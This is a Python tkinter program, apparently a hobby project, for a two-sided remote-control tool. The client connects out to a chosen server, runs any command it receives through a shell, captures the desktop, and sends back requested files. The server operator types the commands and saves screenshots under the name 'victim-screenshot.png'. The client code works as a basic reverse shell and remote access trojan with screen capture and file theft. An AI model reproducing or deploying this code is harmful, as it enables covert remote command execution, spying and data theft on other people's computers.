import tkinter as tk
from tkinter import messagebox
import socket
import threading
from getpass import getuser
from time import sleep
from time import time
import subprocess
import os
import select
import signal
import pyscreenshot
import pickle

# All the buttons colors:
button_color = '#85d5fb'
pressed_button_color = '#0080FF'

#font
font_name = 'Verdana'


# ____________________server-socket____________________
class Server():

    def __init__(self):
        # This socket is for creating connection with client, after the connection, all the commands of the Command Line will be send with this socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


        # We stop the threads using boolean variables, indeed we break the loop of the function  
        self.is_client_connected = False
        self.is_server_listening = False

        self.recv_out_put_bool = True
        self.accept_client_bool = True
        self.capture_ping_bool = True

        self.client_ping = None
        self.client = None



    def capture_ping(self, ip_addr, port):

        try:
            self.ping_socket.bind((ip_addr, (int(port))))
            self.ping_socket.listen(1)

            self.server_socket.bind((ip_addr, (int(port)+1) ))
            self.server_socket.listen(1)

            self.accept_client_bool = True
        # If we can't creat server and start listening, we show to the user the reason(error)
        except socket.error as error:
            if str(error) == "[Errno 98] Address already in use":
                run_login.run_server.print_server_connection_state.config(text="Use an other port and Try again!")
            else:
                run_login.run_server.socket_error.pack()
                run_login.run_server.socket_error.config(text=error)

            self.accept_client_bool = False

        if self.accept_client_bool:
            run_login.run_server.listen_btn.config(state='disabled')
            run_login.run_server.print_server_connection_state.config(text='Listening...')
            if run_login.run_server.socket_error.winfo_exists():
                run_login.run_server.socket_error.destroy()

        while self.accept_client_bool:
            read, _, _ = select.select([self.ping_socket], [], [], 0.5)
            if self.ping_socket in read:
                self.client_ping, self.addr_ping = self.ping_socket.accept()
                self.client, self.addr = self.server_socket.accept()
                print("1.Clients connected!")

                root.configure(background='green')

                run_login.run_server.command_page()

                self.client_username = self.client.recv(1024).decode()
                run_login.run_server.right_bar_client_label.config(text=self.client_username)
                run_login.run_server.addr_0_label.config(text=self.addr[0])
                run_login.run_server.addr_1_label.config(text=self.addr[1])

                self.is_server_listening = False
                self.is_client_connected = True

                self.recv_out_put_thread = threading.Thread(target=self.recv_out_put, args=())
                self.recv_out_put_thread.start()
                
                started_time = time()
            else:
                continue
            while self.capture_ping_bool:
                readable, _, _ = select.select([self.client_ping], [], [], 1)
                if self.client_ping in readable:
                    try:
                        self.ping = self.client_ping.recv(1024)
                    except socket.error as e:
                        if str(e) == "[Errno 9] Bad file descriptor":
                            continue


                    if self.ping == b'ping':
                        self.client_ping.sendall(b'pong')
                        self.is_client_connected = True
                        root.configure(background='green')
                        started_time = time()

                    elif(int(time() - started_time)) > 5:
                        self.client_ping.close()
                        self.client.close()
                        print("44.clients closed!")
                        self.client_ping = None
                        self.is_server_listening = True
                        self.is_client_connected = False
                        run_login.run_server.addr_0_label.config(text="")
                        run_login.run_server.addr_1_label.config(text="")
                        run_login.run_server.right_bar_client_label.config(text="Disconnected!")

                        break

                    elif(int(time() - started_time)) > 2:
                        root.configure(background='red')
                        self.is_server_listening = True

                    else:
                        pass

        
    # Whith this fuction we send our command to the client
    def send_command(self):
        self.cmnd = run_login.run_server.command_entry.get()
        run_login.run_server.command_entry.delete(0, tk.END)
        if self.cmnd != "":
            if self.cmnd == "clear" or self.cmnd == "cls":
                run_login.run_server.output_list.delete(0, tk.END)
            elif self.client is not None:
                if self.client.fileno() != -1:
                    run_login.run_server.output_list.insert(tk.END, f'{self.client_username}:> {self.cmnd}')
                    try:
                        self.client.send(self.cmnd.encode())
                    except socket.error as error:
                        print(f"6.{error}")                         
                else:
                    self.client.close()
                    run_login.run_server.output_list.insert(tk.END, "Oops! Can't send command! Client isn't connected!")
            else:
                run_login.run_server.output_list.insert(tk.END, "Oops! Client isn't connected yet")
        else:
            run_login.run_server.output_list.insert(tk.END, "Oops! Command can't be Empty!")

        
            
            
        

    def recv_out_put(self):
        while self.recv_out_put_bool:
            try:
                if self.client.fileno() == -1:
                    self.client.close()
                    continue
                read, _, _ = select.select([self.client], [], [], 1)
                if self.client in read:
                    self.output = self.client.recv(1024).decode()
                    if not self.output:
                        self.client.close()
                        self.is_client_connected = False
                        break
                    if self.output == "screenshot--*#($)&":
                        self.client.sendall(b'ok')
                        data = self.client.recv(1024).decode()
                        self.file_name, self.file_size = data.split('|')
                        self.file_size = int(self.file_size)
                        self.client.sendall(b'ok')

                        with open("victim-screenshot.png", 'wb') as file:
                            while self.file_size > 0:
                                data = self.client.recv(min(self.file_size, 4096))
                                file.write(data)
                                self.file_size -= len(data)
                                if not data:
                                    break
                            self.client.sendall(b'ok')
                        subprocess.run(['xdg-open', 'victim-screenshot.png'])
                        

                    else:
                        self.output_lines = self.output.split('\n')
                        for self.line in self.output_lines:
                            run_login.run_server.output_list.insert(tk.END, self.line)
                        run_login.run_server.output_list.yview(tk.END)

            except socket.error as error:
                if str(error) == "[Errno 9] Bad file descriptor":
                    pass
                elif str(error) == "[Errno 32] Broken pipe":
                    self.client.close()
                else:
                    print(f'3.{error}')
                    break
            




# ____________________client-socket____________________
class Client():

    def __init__(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.client_windows_username = getuser()

        self.is_client_connecting = False
        self.is_connected_to_server = False

        self.client_connecting_bool = True
        self.cln_send_ping_bool = False
        self.get_send_command_bool = True

    def client_connect(self, ip_addr, port, time=3):
        self.is_client_connecting = True

        while self.client_connecting_bool:
            try:
                self.ping_socket.connect((ip_addr, int(port)))
                self.client_socket.connect((ip_addr, (int(port)+1 )))
                print("1.sockets connected")

                self.is_connected_to_server = True
                self.is_client_connecting = False
                self.cln_send_ping_bool = True

                self.client_socket.send(self.client_windows_username.encode())

                self.get_send_command_bool = True
                self.get_send_command_thread = threading.Thread(target=self.get_send_command, args=())
                self.get_send_command_thread.start()

                run_login.run_client.client_connect_server.config(state='disabled')
                root.configure(background='green')

            except socket.error as error:

                if str(error) == "[Errno 111] Connection refused":
                    try:
                        run_login.run_client.print_connection_state_label.config(text='Connecting')
                        if not self.client_connecting_bool:
                            break
                        sleep(0.5)
                        run_login.run_client.print_connection_state_label.config(text='Connecting.')
                        if not self.client_connecting_bool:
                            break
                        sleep(0.5)
                        run_login.run_client.print_connection_state_label.config(text="Connecting..")
                        if not self.client_connecting_bool:
                            break
                        sleep(0.5)
                        run_login.run_client.print_connection_state_label.config(text="Connecting...")
                        if not self.client_connecting_bool:
                            break
                        sleep(0.5)
                        continue
                    except:
                        sleep(0.5)
                else:
                    run_login.run_client.print_connection_state_label.config(text=error)

            while self.cln_send_ping_bool:
                try:
                    self.ping_socket.sendall(b'ping')
                except socket.error as error:
                    if str(error) == "[Errno 32] Broken pipe":
                        try:
                            self.ping_socket.shutdown(socket.SHUT_RDWR)
                        except:
                            pass
                        self.ping_socket.close()
                        self.client_socket.close()
                        root.configure(background='red')
                        self.is_connected_to_server = False
                        self.is_client_connecting = True
                        self.get_send_command_bool = False
                        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        run_login.run_client.cln_connect_page()
                        break
                    
                if self.ping_socket.fileno() != -1:
                    readable, _, _ = select.select([self.ping_socket], [], [], 1)

                    if self.ping_socket in readable:
                        if self.ping_socket.fileno() != -1:
                            try:
                                self.pong = self.ping_socket.recv(1024)
                                if self.pong == b'pong':
                                    self.is_connected_to_server = True
                                    sleep(time)
                            except:
                                continue

    def get_send_command(self):
        while self.get_send_command_bool:
            if self.client_socket.fileno() != -1:
                readable, _, _ = select.select([self.client_socket], [], [], 0.5)
                if self.client_socket in readable:
                    try:
                        self.command = self.client_socket.recv(1024).decode()

                        if self.command == "exit":
                            pid = os.getpid()
                            os.kill(pid, signal.SIGTERM)
                            exit_program()

                        elif self.command[0:3] == "cd ":
                            os.chdir(self.command[3:])
                            self.client_socket.send(os.getcwd().encode())

                        elif self.command == 'screenshot':
                            try:
                                self.client_socket.send("screenshot--*#($)&".encode())
                                self.client_socket.recv(1024)
                                self.screenshot = pyscreenshot.grab()
                                self.file_name = "screenshot--*#($)&.png"
                                self.screenshot.save(self.file_name)

                                self.file_size = os.path.getsize(self.file_name)
                                self.client_socket.send(f"{self.file_name}|{self.file_size}".encode())
                                self.msg = self.client_socket.recv(1024)
                                if self.msg == b'ok':
                                    try:
                                        file = open(self.file_name, 'rb')
                                        data = file.read()
                                    except:
                                        self.client_socket.send("could not open screenshot file!".encode())
                                    try:
                                        self.client_socket.sendall(data)
                                        self.client_socket.recv(1024)
                                    except:
                                        self.client_socket.send("could not send data!".encode())
                                else:
                                    raise Exception('client did not recieved file name and size')

                            except:
                                self.client_socket.send("couldn't take screenshot".encode())

                        elif self.command[0:8] == "showfile":
                            self.file_name = self.command[9:]
                            self.file_directory = f"{os.getcwd()}/{self.file_name}"
                            try:
                                with open(self.file_directory, 'rb') as file:
                                    self.data = file.read()
                            except:
                                self.client_socket.send("couldn't open the file!".encode())
                            try:
                                self.client_socket.sendall(self.data)
                            except:
                                print("coudn't send the file!")
                                
                        else:
                            try:
                                self.completed_process = subprocess.run(self.command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
                                self.output = self.completed_process.stdout.decode()
                            except subprocess.TimeoutExpired:
                                self.output = "Command timed out after 2 seconds"
                                
                            if self.output == "" or self.output == None:
                                self.output = "\n"
                                self.client_socket.send(self.output.encode())
                            else:
                                self.client_socket.send(self.output.encode())
                    except socket.error as error:
                        if str(error) == "[Errno 9] Bad file descriptor":
                            continue
                        if str(error) == "[Errno 32] Broken pipe":
                            root.configure(background='red')
                            break
                        else:
                            print(f'5.{error}')
            else:
                root.configure(background='red')
                break

# ____________________login-window____________________
class Login_frame():
    
    def __init__(self, window):

        self.window = window

        
    def show(self):

        destroy_old_frames(self.window)
        
        # The Frame
        self.login_frame = tk.Frame(self.window)
        root.configure(background='red')
        
        
        # The Content
        self.choose_label = tk.Label(self.login_frame,
                                     text="CHOOSE USER",
                                     font=(font_name, 15),
                                     bg="white",
                                     fg='black'
                                     )
        self.server_btn = tk.Button(self.login_frame,
                                    text="SERVER",
                                    font=(font_name),
                                    bg=button_color,
                                    fg='black',
                                    width=90,height=2,
                                    command=self.choosen_server
                                    )
        self.client_btn = tk.Button(self.login_frame,
                                    text="CLIENT",
                                    font=(font_name),
                                    bg=button_color,
                                    fg='black',
                                    width=90,height=2,
                                    command=self.choosen_client
                                    )

        self.login_frame.place(x=10, y=10)
        self.login_frame.pack_propagate(False)
        self.login_frame.configure(width=1580, height=880, background='white')
        # Appending our content
        self.choose_label.place(x=715, y=310)
        self.server_btn.place(x=320, y=520)
        self.client_btn.place(x=320, y=570)
        

    # if user chooses server
    def choosen_server(self):
        self.server = Server()

        self.run_server = Server_frame(root)

        # we display connect page for default
        self.run_server.connect_page()


    # if user chooses client
    def choosen_client(self):
        self.client = Client()

        self.run_client = Client_frame(root)

        self.run_client.cln_connect_page()






# ____________________server-window____________________
class Server_frame():
    def __init__(self, window):

        destroy_old_frames(window)

        # --------------------Frames--------------------
        self.options_frame = tk.Frame(window)               # Left bar
        self.main_frame = tk.Frame(window)                  # Middle bar
        self.right_frame = tk.Frame(window)                 # right bar 

        # Showing the Frames
        self.options_frame.place(x=10, y=10)
        self.options_frame.pack_propagate(False)            # False: we can resize the frame and it will not cover all the window automaticlly
        self.options_frame.configure(width=300, height=880)

        self.main_frame.place(x=320, y=10)  
        self.main_frame.pack_propagate(False)
        self.main_frame.configure(width=960, height=880, background='white')

        self.right_frame.place(x=1290, y=10)
        self.right_frame.pack_propagate(False)
        self.right_frame.configure(width=300, height=880, background='white')


        # --------------------Left bar (Options bar)--------------------
        self.choose_user_btn = tk.Button(self.options_frame,
                                       text='Back',
                                       font=(font_name, 25),
                                       bg=button_color,
                                       padx=20,pady=1,
                                       width=10,height=1,
                                       anchor="n",
                                       command=lambda: (self.choose_user_page())
                                       )
        self.connect_btn = tk.Button(self.options_frame,
                                     text='Connection',
                                     font=(font_name, 25),
                                     bg=button_color,
                                     padx=20,pady=1,
                                     width=10,height=1,
                                     anchor="n",
                                     command=lambda: (self.connect_page())
                                     )
        self.command_btn = tk.Button(self.options_frame,
                                     text='Command Line',
                                     font=(font_name, 25),
                                     bg=button_color,
                                     padx=20,width=10,height=1,
                                     pady=1,anchor="n",
                                     command=lambda: (self.command_page())
                                     )
        self.file_transfer_btn = tk.Button(self.options_frame,
                                       text='Transfer',
                                       font=(font_name, 25),
                                       bg=button_color,
                                       padx=20,width=10,height=1,
                                       pady=1,anchor="n",
                                       command=lambda: (self.file_transfer_page())
                                       )
        self.setting_btn = tk.Button(self.options_frame,
                                     text='Setting',
                                     font=(font_name, 25),
                                     bg=button_color,
                                     padx=20,width=10,height=1,
                                     pady=1,anchor="n",
                                     command=lambda: (self.setting_page())
                                     )
        self.help_btn = tk.Button(self.options_frame,
                                  text='Help',
                                  font=(font_name, 25),
                                  bg=button_color,
                                  padx=20,width=10,height=1,
                                  pady=1,anchor="n",
                                  command=lambda: (self.help_page())
                                  )

        # Showing the Options bar
        self.choose_user_btn.place(x=10, y=50)
        self.connect_btn.place(x=10, y=130)
        self.command_btn.place(x=10, y=210)
        self.file_transfer_btn.place(x=10,y=290)
        self.setting_btn.place(x=10, y=370)
        self.help_btn.place(x=10, y=450)


        # --------------------right bar--------------------
        # ----------Client----------
        self.right_bar_client_frame = tk.Frame(self.right_frame)

        self.right_bar_client_frame.place(x=5, y=5)
        self.right_bar_client_frame.pack_propagate(False)
        self.right_bar_client_frame.configure(width=290, height=280)
        
        self.right_bar_client_label = tk.Label(self.right_bar_client_frame,
                               font=(font_name, 15),
                               text='Client',
                               padx=0, pady=25
                               )
        self.addr_0_label = tk.Label(self.right_bar_client_frame,
                               font=(font_name, 15),
                               text='',
                               padx=20, pady=2,
                               anchor='nw'
                               )
        self.addr_1_label = tk.Label(self.right_bar_client_frame,
                               font=(font_name, 15),
                               text='',
                               padx=20, pady=2,
                               anchor='ne'
                               )
        
        self.right_bar_client_label.pack(side='top')
        self.addr_0_label.pack(side='left', fill='both')
        self.addr_1_label.pack(side='right', fill='both')

        # ----------voice chat----------
        self.right_bar_voice_frame = tk.Frame(self.right_frame)

        self.right_bar_voice_frame.place(x=5, y=290)
        self.right_bar_voice_frame.pack_propagate(False)
        self.right_bar_voice_frame.configure(width=290, height=585)

        self.right_bar_voice_chat_label = tk.Label(self.right_bar_voice_frame,
                                                   font=(font_name, 15),
                                                   text='Voice Chat',
                                                   pady=20
                                                   )
        self.right_bar_voice_chat_label.pack(side='top')



    # --------------------middle bar--------------------
    # All the Pages that the user can access pressing the left bar buttons

    # ----------Back page----------
    # Δεν Δουλεύει και δεν τα κατάφερα ακόμα!
    def choose_user_page(self):

        run_login.server.recv_out_put_bool = False
        run_login.server.accept_client_bool = False
        run_login.server.capture_ping_bool = False

        if hasattr(run_login.server, "client_ping"):
            if run_login.server.client_ping is not None:
                run_login.server.client_ping.close()
                run_login.server.client.close()

        del run_login.run_server
        del run_login.server

        run_login.show()


    # --------------------Connection page--------------------
    def connect_page(self):
        self.indicate(self.connect_btn)

        self.connect_frame = tk.Frame(self.main_frame)
        
        self.connect_frame.place(x=5, y=5)
        self.connect_frame.pack_propagate(False)
        self.connect_frame.configure(width=950, height=870)


        self.server_ip_addr_label = tk.Label(self.connect_frame,
                                             text='IP Addr',
                                             font=(font_name, 15),
                                             width=0,
                                             height=5,
                                             anchor='s'
                                             )
        self.server_ip_addr_entry = tk.Entry(self.connect_frame,
                                             font=(font_name, 13),
                                             width=40
                                             )
        self.server_port_label = tk.Label(self.connect_frame,
                                          text='PORT',
                                          font=(font_name, 15),
                                          width=0,
                                          height=2,
                                          anchor='s'
                                          )
        self.server_port_entry = tk.Entry(self.connect_frame,
                                          font=(font_name, 13),
                                          width=40
                                          )
        self.listen_btn = tk.Button(self.connect_frame,
                                    bg="#85d5fb",
                                    text='START',
                                    font=font_name,
                                    width=5,
                                    height=1,
                                    command=lambda: self.listen_btn_click()
                                    )
        self.print_server_connection_state = tk.Label(self.connect_frame,
                                        font=(font_name, 20),
                                        text="",
                                        height=4
                                        )
        self.error_label = tk.Label(self.connect_frame,
                                    font=(font_name, 15),
                                    text="We show errors here",
                                    bg='red',
                                    fg='white'
                                    )
        self.socket_error = tk.Label(self.connect_frame,
                                     font=(font_name, 20),
                                     text='error',
                                     bg='red',
                                     fg='white'
                                     )
        
        # We have written this code because when we change the page to connection page, we can see ip addr, port and the connection state
        if run_login.server.is_server_listening:
            self.server_ip_addr_entry.insert(0, run_login.run_server.server_ip)
            self.server_port_entry.insert(0, run_login.run_server.server_port)
            run_login.run_server.listen_btn.config(state='disabled')
            run_login.run_server.print_server_connection_state.config(text='Listening...')
 
        elif run_login.server.is_client_connected:
            self.server_ip_addr_entry.insert(0, run_login.run_server.server_ip)
            self.server_port_entry.insert(0, run_login.run_server.server_port)
            run_login.run_server.listen_btn.config(state='disabled')    
            run_login.run_server.print_server_connection_state.config(text='Connected')
        else:
            # if it is for the first time we are openning the connection page, our ip address is automaticlly inserted!
            self.server_ip_addr_entry.insert(0, get_private_ip_address())
            self.server_port_entry.insert(0, 8119)

        self.server_ip_addr_label.pack()
        self.server_ip_addr_entry.pack()
        self.server_port_label.pack()
        self.server_port_entry.pack()
        self.listen_btn.pack()
        self.print_server_connection_state.pack()

    
    # ----------Command Line page----------
    def command_page(self):
        self.indicate(self.command_btn)

        self.command_frame = tk.Frame(self.main_frame)
        self.command_frame.place(x=5, y=5)
        self.command_frame.pack_propagate(True)
        self.command_frame.configure(width=950, height=870)

        self.output_frame = tk.Frame(self.command_frame)
        self.output_frame.place(x=50, y=50)
        self.output_frame.pack_propagate(False)
        self.output_frame.configure(width=860, height=670, background='black')

        self.output_label = tk.Label(self.main_frame,
                                     text="Output:",
                                     font=(font_name, 15)
                                     )
        self.output_label.place(x=50, y=20)
        
        # ----------------------------------------Listbox scrollbar----------------------------------------

        self.output_list = tk.Listbox(self.output_frame,
                                      font=(font_name, 20),
                                      bg='black',
                                      fg='green'
                                      )
        self.scrollbar = tk.Scrollbar(self.output_frame)
        self.scrollbar.pack(side=tk.RIGHT, fill='both')
        self.output_list.pack(side='left',expand=True, fill='both')

        self.output_list.config(yscrollcommand=self.scrollbar.set)
        self.scrollbar.config(command=self.output_list.yview)

        # --------------------------------------------------------------------------------------------------


        self.print_new_command_label = tk.Label(self.main_frame,
                                                text='New Command:',
                                                font=(font_name, 15)
                                                )
        self.command_entry = tk.Entry(self.main_frame,
                                      font=(font_name, 20),
                                      fg='green',
                                      bg='black',
                                      width=50,
                                      )
        self.send = tk.Button(self.main_frame,
                              text="Send",
                              command= lambda: run_login.server.send_command()
                              )
        
        self.print_new_command_label.place(x=50, y=730)
        self.command_entry.place(x=50, y=760)
        self.send.place(x=450, y=825)


    # ----------Transfer page----------
    def file_transfer_page(self):
        self.indicate(self.file_transfer_btn)
        self.file_transfer_frame = tk.Frame(self.main_frame)

        self.file_transfer_frame.place(x=0, y=0)
        self.file_transfer_frame.pack_propagate(False)
        self.file_transfer_frame.configure(width=960, height=880)

        # θα γράψουμε μετά

        self.rtfm_label = tk.Label(self.main_frame, text='RTFM', font=(5))
        self.rtfm_label.place(x=450, y=300)


    # ----------Setting page----------
    def setting_page(self):
        self.indicate(self.setting_btn)
        self.setting_frame = tk.Frame(self.main_frame)

        self.setting_frame.place(x=0, y=0)
        self.setting_frame.pack_propagate(False)
        self.setting_frame.configure(width=960, height=880)

        # θα γράψουμε μετά


    # ----------Help page----------
    def help_page(self):
        self.indicate(self.help_btn)
        page_frame = tk.Frame(self.main_frame)

        page_frame.place(x=0, y=0)
        page_frame.pack_propagate(False)
        page_frame.configure(width=960, height=880)
        
        # θα γράψουμε μετά



    # --------------------object functions--------------------

    # Each time we change the pages, pressing any button on option(left) bar:
    # 1) We destroy old pages(frames) on the main frame
    #    using the function: destroy_old_frames()
    # 2) We highlit the pressed button by changing it's color to pressed_button_color
    #    using the function: indicate()
    # 3) Display the pressed button page

    def hide_indicator(self):
        self.choose_user_btn.config(bg=button_color)
        self.connect_btn.config(bg=button_color)
        self.command_btn.config(bg=button_color)
        self.file_transfer_btn.config(bg=button_color)
        self.setting_btn.config(bg=button_color)
        self.help_btn.config(bg=button_color)


    def indicate(self, button):
        self.hide_indicator()
        button.config(bg=pressed_button_color)
        destroy_old_frames(self.main_frame)


    # This fuction will be activated when user presses the start button of connection page
    def listen_btn_click(self):
        self.server_ip = self.server_ip_addr_entry.get()
        self.server_port = self.server_port_entry.get()


        if not is_valid_ip_address(self.server_ip):
            run_login.run_server.error_label.config(text='Invalid ip address!\nRTFM')
            run_login.run_server.error_label.pack()
        elif not is_valid_port(self.server_port):
            run_login.run_server.error_label.config(text='Invalid port!\nRTFM')
            run_login.run_server.error_label.pack()
        else:
            run_login.run_server.error_label.destroy()
            self.listening_thread = threading.Thread(target=run_login.server.capture_ping, args=(self.server_ip, self.server_port))
            self.listening_thread.start()







# ____________________client-window____________________
class Client_frame():
    def __init__(self, window):

        destroy_old_frames(window)

        # Frames
        self.cln_options_frame = tk.Frame(window)
        self.cln_main_frame = tk.Frame(window)
        self.cln_right_frame = tk.Frame(window)

        # Showing the Frames
        self.cln_options_frame.place(x=10, y=10)
        self.cln_options_frame.pack_propagate(False)
        self.cln_options_frame.configure(width=300, height=880, background='white')

        self.cln_main_frame.place(x=320, y=10)
        self.cln_main_frame.pack_propagate(False)
        self.cln_main_frame.configure(width=960, height=880)

        self.cln_right_frame.place(x=1290, y=10)
        self.cln_right_frame.pack_propagate(False)
        self.cln_right_frame.configure(width=300, height=880, background='white')


        # ----------options bar(left bar)----------
        self.cln_choose_user_btn = tk.Button(window,
                                       text='Back',
                                       font=(font_name, 25),
                                       bg=button_color,
                                       padx=20,pady=1,
                                       width=10,height=1,
                                       anchor="n",
                                       command=lambda: self.cln_choose_user_page()
                                       )
        self.cln_connect_btn = tk.Button(window,
                                     text='Connect',
                                     font=(font_name, 25),
                                     bg=button_color,
                                     padx=20,pady=1,
                                     width=10,height=1,
                                     anchor="n",
                                     command=lambda: self.cln_connect_page()
                                     )
        self.cln_help_btn = tk.Button(window,
                                  text='Help',
                                  font=(font_name, 25),
                                  bg=button_color,
                                  padx=20,pady=1,
                                  width=10,height=1,
                                  anchor="n",
                                  command=lambda: self.cln_help_page()
                                  )
        
        

        self.cln_choose_user_btn.place(x=20, y=50)
        self.cln_connect_btn.place(x=20, y=130)
        self.cln_help_btn.place(x=20, y=210)


    def hide_indicator(self):
        self.cln_choose_user_btn.config(bg=button_color)
        self.cln_connect_btn.config(bg=button_color)
        self.cln_help_btn.config(bg=button_color)


    def indicate(self, button):
        self.hide_indicator()
        button.config(bg=pressed_button_color)
        destroy_old_frames(self.cln_main_frame)


    def client_connect_click(self):
        self.client_ip = self.client_ip_addr_entry.get()
        self.client_port = self.client_port_entry.get()

        if not is_valid_ip_address(self.client_ip):
            run_login.run_client.error_label.pack()
            run_login.run_client.error_label.config(text=' Invalid Ip address! ')
        elif not is_valid_port(self.client_port):
            run_login.run_client.error_label.pack()
            run_login.run_client.error_label.config(text=' Invalid Port! ')            
        else:
            self.client_connection_thread = threading.Thread(target=run_login.client.client_connect, args=(self.client_ip, self.client_port))
            self.client_connection_thread.start()
            run_login.run_client.client_connect_server.config(state='disabled')

    

    # Pages
    # ----------Back page----------
    def cln_choose_user_page(self):
        
        run_login.client.client_connecting_bool = False
        run_login.client.get_send_command_bool = False
        run_login.client.cln_send_ping_bool = False

        del run_login.run_client
        del run_login.client

        run_login.show()

    # ----------Connection page----------
    def cln_connect_page(self):
        self.indicate(self.cln_connect_btn)
        self.cln_connect_frame = tk.Frame(self.cln_main_frame)
        self.cln_connect_frame.pack()

        self.client_ip_addr_label = tk.Label(self.cln_main_frame,
                                             text='SERVER-IP',
                                             font=(font_name, 15),
                                             width=0,
                                             height=5,
                                             anchor="s"
                                             )
        self.client_ip_addr_entry = tk.Entry(self.cln_main_frame,
                                             font=(font_name, 13),
                                             width=40
                                             )
        self.client_port_label = tk.Label(self.cln_main_frame,
                                          text='PORT',
                                          font=(font_name, 15),
                                          width=0,
                                          height=2,
                                          anchor="s"
                                          )
        self.client_port_entry = tk.Entry(self.cln_main_frame,
                                          font=(font_name, 13),
                                          width=40
                                          )
        self.client_connect_server = tk.Button(self.cln_main_frame,
                                               bg=button_color,
                                               text='START',
                                               font=(font_name),
                                               width=5,
                                               height=1,
                                               anchor="center",
                                               command=lambda: self.client_connect_click()
                                               )
        self.print_connection_state_label = tk.Label(self.cln_main_frame,
                                                font=(font_name),
                                                text="",
                                                height=4
                                                )
        self.error_label = tk.Label(self.cln_main_frame,
                                    font=(font_name, 15),
                                    text='We show errors here',
                                    bg='red',
                                    fg='white'
                                    )
        self.socket_error_label = tk.Label(self.cln_main_frame,
                                    font=(font_name, 15),
                                    text='We show socket-errors here',
                                    bg='red',
                                    fg='white'
                                    )
        
        if run_login.client.is_client_connecting:
            run_login.run_client.client_ip_addr_entry.insert(0, run_login.run_client.client_ip)
            run_login.run_client.client_port_entry.insert(0, run_login.run_client.client_port)            
            run_login.run_client.client_connect_server.config(state='disabled')
        elif run_login.client.is_connected_to_server:
            run_login.run_client.client_ip_addr_entry.insert(0, run_login.run_client.client_ip)
            run_login.run_client.client_port_entry.insert(0, run_login.run_client.client_port)            
            run_login.run_client.client_connect_server.config(state='disabled')
            run_login.run_client.print_connection_state_label.config(text='Connected!')            
        else:
            self.client_ip_addr_entry.insert(0, get_private_ip_address())
            self.client_port_entry.insert(0, 8119)
        
        self.client_ip_addr_label.pack()
        self.client_ip_addr_entry.pack()
        self.client_port_label.pack()
        self.client_port_entry.pack()
        self.client_connect_server.pack()
        self.print_connection_state_label.pack()

    # ----------Help page----------
    def cln_help_page(self):
        self.indicate(self.cln_help_btn)
        self.cln_help_frame = tk.Frame(self.cln_main_frame)
        self.cln_help_frame.pack()





# ____________________Functions____________________

def destroy_old_frames(frame):
    for children_frame in frame.winfo_children():
        children_frame.destroy()


def get_private_ip_address():
    try:
        # If it is connected to Internet, the function returns the private ip address
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_socket.connect(('8.8.8.8', 80))
        ip_address = temp_socket.getsockname()[0]
        # otherwise return the local ip
    except socket.error:
        ip_address = '127.0.0.1'
    finally:
        temp_socket.close()
    return ip_address


def is_valid_ip_address(ip_address):
    segments = ip_address.split(".")
    if len(segments) != 4:
        return False
    for segment in segments:
        if not segment.isdigit():
            return False
        if int(segment) < 0 or int(segment) > 255:
            return False
    return True


def is_valid_port(port):
    try:
        port = int(port)
        if 1024 < port and port < 65535:
            return True
        else:
            return False
    except ValueError:
        return False


def exit_program():
    if hasattr(run_login, "server"):
        run_login.server.recv_out_put_bool = False
        run_login.server.accept_client_bool = False
        run_login.server.capture_ping_bool = False

        if hasattr(run_login.server, "client_ping"):
            if run_login.server.client_ping is not None:
                try:
                    run_login.server.ping_socket.shutdown(socket.SHUT_RDWR)
                    run_login.server.server_socket.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                run_login.server.client_ping.close()
                run_login.server.client.close()
            
    if hasattr(run_login, "client"):
        run_login.client.client_connecting_bool = False
        run_login.client.cln_send_ping_bool = False
        run_login.client.get_send_command_bool = False

        try:
            run_login.client.ping_socket.shutdown(socket.SHUT_RDWR)
            run_login.client.client_socket.shutdown(socket.SHUT_RDWR)
        except:
            pass
        run_login.client.ping_socket.close()
        run_login.client.client_socket.close()

    root.destroy()
    exit()


def x():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        exit_program()

#__________________________________________________


# Creating a window
root = tk.Tk()
root.geometry("1600x900")
root.configure(background='red')
root.title("Matin")
root.protocol("WM_DELETE_WINDOW", x)


# Runnig program 
run_login = Login_frame(root)
run_login.show()


root.mainloop()
